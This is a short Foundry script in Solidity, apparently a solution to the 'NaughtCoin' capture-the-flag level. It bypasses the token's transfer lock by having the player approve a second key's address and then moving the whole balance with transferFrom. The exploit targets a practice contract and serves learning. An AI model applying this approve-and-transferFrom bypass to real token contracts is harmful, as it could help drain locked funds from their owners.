// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/Level15.sol";

contract Attacker {
}

contract CallContractScript is Script {
    function run() external {
        // 指定私钥，可以从环境变量中获取，例如：process.env.PRIVATE_KEY
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        uint256 privateKeySpender = vm.envUint("PRIVATE_KEY_SPENDER");

        address player = vm.addr(privateKey);
        address spender = vm.addr(privateKeySpender);

        address levelAddr = 0x69f52ffB405AB5DaaEbDb1111C4F5ec64DaF37C8;
        NaughtCoin level = NaughtCoin(levelAddr);

        // 初始化 player
        vm.startBroadcast(privateKey);
        level.approve(spender, level.balanceOf(player));
        vm.stopBroadcast();

        // 初始化 spender
        vm.startBroadcast(privateKeySpender);
        level.transferFrom(player, spender, level.balanceOf(player));
        vm.stopBroadcast();
    }
}
